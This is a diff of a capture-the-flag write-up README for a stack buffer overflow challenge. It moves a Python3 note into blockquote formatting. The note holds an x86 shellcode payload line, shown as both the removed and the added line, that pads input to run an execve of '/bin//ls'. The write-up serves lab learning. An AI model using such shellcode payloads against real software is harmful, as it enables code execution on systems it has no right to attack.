@@ -15,7 +15,8 @@ This is the same program as stack0 part 1. Now, read the contents of flag2.txt.
 
 ## Write-up
 >Note: The scripts in this solution work with Python2. As Python3 uses Unicode for the basic string, and print() expects Unicode, for Python3, the line in the script that sets the the byte values of the code should be changed to (for example):
- send_str=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + b"A"*26)')
+>
+> send_str=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + b"A"*26)')
 
 This is a buffer overflow challenge, building on [Pwn_stack0pt1](https://github.com/neuronflicker/CTF/tree/master/UCF/Pwn_stack0pt1), and the code file was provided.
 
